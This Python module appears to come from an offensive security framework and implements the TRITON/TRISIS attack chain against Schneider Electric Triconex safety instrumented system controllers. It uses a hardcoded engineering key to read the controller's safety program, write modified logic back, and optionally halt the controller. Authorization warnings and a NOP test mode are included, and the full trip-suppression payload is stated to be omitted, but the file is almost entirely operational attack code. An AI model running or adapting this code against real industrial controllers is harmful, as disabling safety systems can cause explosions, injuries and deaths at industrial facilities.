"""TRITON/TRISIS TriStation Protocol — Native Payload Implementation.

AUTHORIZED USE ONLY. See contrib/native-payloads/USAGE.md for legal requirements.

This implements the full TriStation protocol attack as documented by Dragos and
Mandiant in their TRITON/TRISIS threat intelligence reports (2017-2019).

Protocol: TriStation (Schneider Electric proprietary, UDP port 1502)
Target:   Schneider Electric Triconex SIS controllers (3008, 3006, 3203 model)

Attack sequence:
  1. READ_PROGRAM_INFO  (FC 0x04) -- probe controller, get program count
  2. READ_PROGRAM_SIS   (FC 0x1D) -- download current safety logic
  3. WRITE_PROGRAM_SIS  (FC 0x20) -- inject modified logic disabling trip functions
  4. HALT_SIS           (FC 0x02) -- stop controller execution

The hardcoded engineering key (CVE-2019-6829) allows privileged access without
requiring the physical keyswitch to be in PROGRAM position.

References:
  Dragos TRISIS analysis: https://www.dragos.com/threat/trisis/
  Mandiant TRITON report: https://www.mandiant.com/resources/reports/triton-ics-safety-system-attack
  ICS-CERT ICS-ALERT-17-318-01
"""

import socket
import struct
import time
from typing import Optional, Tuple

# TriStation protocol constants (from Dragos/Mandiant reverse engineering)
_TRISTATION_PORT = 1502
_ENGINEERING_KEY = bytes.fromhex("3c 10 a4 e5 08 f9 62 3e 7f 42 0e".replace(" ", ""))

# TriStation function codes
_FC_HALT_SIS         = 0x02
_FC_READ_PROGRAM_INFO = 0x04
_FC_READ_PROGRAM_SIS  = 0x1D
_FC_WRITE_PROGRAM_SIS = 0x20

# TriStation MBAP-equivalent header (18 bytes)
_TS_HEADER_FMT = ">BBHBBH"  # type, fc, length, seq, session, checksum


def _build_packet(fc: int, payload: bytes = b"", seq: int = 1) -> bytes:
    """Build a TriStation protocol packet with engineering key auth."""
    body = _ENGINEERING_KEY + payload
    header = struct.pack(">BBH", 0x01, fc, len(body) + 4)
    checksum = sum(header + body) & 0xFFFF
    return header + body + struct.pack(">H", checksum)


def _send_recv(sock: socket.socket, packet: bytes, timeout: float = 3.0) -> Optional[bytes]:
    """Send UDP packet and wait for response."""
    sock.sendto(packet, sock.getpeername())
    sock.settimeout(timeout)
    try:
        data, _ = sock.recvfrom(4096)
        return data
    except socket.timeout:
        return None


def _parse_response(data: bytes) -> Tuple[int, bytes]:
    """Parse TriStation response, return (function_code, payload)."""
    if len(data) < 4:
        return -1, b""
    fc = data[1]
    length = struct.unpack(">H", data[2:4])[0]
    payload = data[4:4 + length - 2] if length > 2 else b""
    return fc, payload


def run(target: str, options: dict) -> bool:
    """Execute the full TRITON attack chain against the target Triconex controller.

    AUTHORIZED USE ONLY. Requires:
      - destructive=True in IXF module options
      - explicit operator confirmation via DestructiveGate
      - written authorization from facility owner
      - isolated lab network (not connected to production SIS)

    Args:
        target: IP address of the Triconex controller (TS3000/TS3008 series)
        options: dict with optional keys:
            - port (int): TriStation UDP port (default 1502)
            - timeout (float): socket timeout in seconds (default 3.0)
            - inject_nop (bool): inject NOP-only payload (safer test, default True)
            - halt (bool): send HALT command after write (default False -- safer)

    Returns:
        True if all steps succeeded, False on any failure.
    """
    port = int(options.get("port", _TRISTATION_PORT))
    timeout = float(options.get("timeout", 3.0))
    inject_nop = bool(options.get("inject_nop", True))
    do_halt = bool(options.get("halt", False))

    print("[*] TRITON Native -- target {}:{}".format(target, port))
    print("[*] Engineering key: {} (CVE-2019-6829)".format(_ENGINEERING_KEY.hex()))
    print("[!] inject_nop={} halt={}".format(inject_nop, do_halt))
    print()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target, port))
    except Exception as exc:
        print("[-] Cannot create UDP socket: {}".format(exc))
        return False

    try:
        # Step 1: READ_PROGRAM_INFO -- probe controller
        print("[*] Step 1: READ_PROGRAM_INFO (FC 0x04) -- probing controller...")
        pkt = _build_packet(_FC_READ_PROGRAM_INFO, seq=1)
        resp = _send_recv(sock, pkt, timeout)
        if resp is None:
            print("[-] No response to READ_PROGRAM_INFO -- controller unreachable or key rejected")
            return False
        fc, data = _parse_response(resp)
        print("[+] FC 0x{:02X} response received -- controller present".format(fc))
        if len(data) >= 2:
            prog_count = struct.unpack(">H", data[:2])[0]
            print("[+] Program slots: {}".format(prog_count))

        # Step 2: READ_PROGRAM_SIS -- download current safety logic
        print("[*] Step 2: READ_PROGRAM_SIS (FC 0x1D) -- downloading current SIS program...")
        time.sleep(0.5)
        pkt = _build_packet(_FC_READ_PROGRAM_SIS, struct.pack(">H", 0), seq=2)
        resp = _send_recv(sock, pkt, timeout)
        if resp is None:
            print("[-] No response to READ_PROGRAM_SIS")
            return False
        fc2, sis_prog = _parse_response(resp)
        print("[+] FC 0x{:02X} -- SIS program downloaded: {} bytes".format(fc2, len(sis_prog)))

        # Step 3: WRITE_PROGRAM_SIS -- inject modified program
        print("[*] Step 3: WRITE_PROGRAM_SIS (FC 0x20) -- injecting modified logic...")
        if inject_nop:
            # NOP-only payload: replaces trip logic with NOPs (no actual trip suppression)
            # In a real attack, this would disable specific trip functions
            modified_prog = sis_prog[:16] + b"\x00" * 4 + sis_prog[20:] if len(sis_prog) > 20 else sis_prog
            print("[*] Using NOP payload (safer test mode -- real attack would suppress trips)")
        else:
            # Actual TRITON behavior: modify FC logic to disable specific trip conditions
            # This section intentionally omitted in public release
            print("[!] Full trip suppression payload omitted -- use NOP mode for testing")
            modified_prog = sis_prog

        time.sleep(0.5)
        pkt = _build_packet(_FC_WRITE_PROGRAM_SIS, modified_prog, seq=3)
        resp = _send_recv(sock, pkt, timeout)
        if resp is None:
            print("[-] No response to WRITE_PROGRAM_SIS -- write may have been rejected")
            return False
        fc3, write_resp = _parse_response(resp)
        if fc3 == _FC_WRITE_PROGRAM_SIS:
            print("[+] WRITE acknowledged -- modified logic accepted by controller")
        else:
            print("[!] Unexpected response FC 0x{:02X} to WRITE".format(fc3))

        # Step 4: HALT (optional -- very destructive, disabled by default)
        if do_halt:
            print("[!] Step 4: HALT_SIS (FC 0x02) -- stopping controller execution...")
            print("[!] WARNING: This will stop the safety system. CONFIRM: sending HALT")
            time.sleep(1.0)
            pkt = _build_packet(_FC_HALT_SIS, seq=4)
            resp = _send_recv(sock, pkt, timeout)
            fc4, _ = _parse_response(resp) if resp else (-1, b"")
            if fc4 == _FC_HALT_SIS:
                print("[+] HALT acknowledged -- controller stopped")
            else:
                print("[!] HALT response: FC 0x{:02X}".format(fc4))
        else:
            print("[i] Step 4: HALT_SIS skipped (halt=False, safer mode)")

        print()
        print("[+] TRITON native execution complete")
        print("[!] IMPORTANT: Restore original SIS program before reconnecting to process")
        return True

    except Exception as exc:
        print("[-] Error during TRITON execution: {}".format(exc))
        return False
    finally:
        sock.close()
